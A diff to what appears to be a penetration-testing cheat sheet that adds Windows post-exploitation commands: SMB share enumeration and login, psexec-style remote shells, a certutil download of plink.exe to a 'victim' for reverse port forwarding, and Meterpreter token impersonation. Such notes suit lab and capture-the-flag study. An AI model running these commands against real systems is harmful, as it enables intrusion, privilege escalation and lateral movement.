@@ -110,6 +110,19 @@ getuid
 
 sysinfo
 
+whoami /priv : List current user privileges (SeImpersonatePrivilege)
+
+where : Equivalent to 'find' 
+	| where /R C:\Windows file.exe : Recursivly search the C:\Windows directory for file.exe
+
+smbclient 
+	| smbclient -L \\\\xxx.xxx.xxx.xxx\\ : Enumerate SMB shares
+	| smbclient -U '<username>%<password>' \\\\10.10.xxx.xxx\\c$ : Login to SMB with <username> in the C:\ directory
+	
+	
+psexec.py | smbexec.py | wmiexec.py
+	| psexec.py <username>:'<password>'@10.10.xxx.xxx : Enumerate / get shell / pwn
+
 shell
 	| systeminfo : Gets System Info
 		| systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
@@ -171,7 +184,15 @@ shell
 		| certutil -urlcache -f xxx.xxx.xxx.xxx:xxxx/file.something file.saveas
 	
 	| Port forwarding with Plink
+		| Upload plink.exe to victim
+			| certutil -urlcache -f xxx.xxx.xxx.xxx:xxxx/plink.exe plink.exe
 		| plink.exe -l <username> -pw <password> -R 445:127.0.0.1:445 10.10.xxx.xxx
+	
+
+	
+	
+	
+	
 	
 =======================
 ===ENUMERATION TOOLS===
@@ -195,7 +216,7 @@ Other:
 Metasploit:
 	
 	| After getting a shell:
-		| getuid : Shows our current user 
+		| getuid : Get user ID 
 		| cd c:\\windows\\somedir\\
 		| upload /path/to/file.something | Uploads a file to the victim
 		| download /path/to/file.something | Downloads a file from the victim
@@ -206,4 +227,10 @@ Metasploit:
 		| migrate <PID> : Increase stability, need privs
 		| run post/windows/gather/checkvm : Check if system is a VM
 		| run autoroute -h : Check if pivoting through the victim will work (has more than 1 NIC and has access to other networks)
+		
+	| Token Impersonation through Meterpreter
+		| getuid : Get user ID
+		| load incognito : Loads module
+		| list_tokens -u : Lists tokens
+		| impersonate_token host\\user : Impersonate the token of <user> on <host> (Can be SYSTEM or Admin etc)
 		
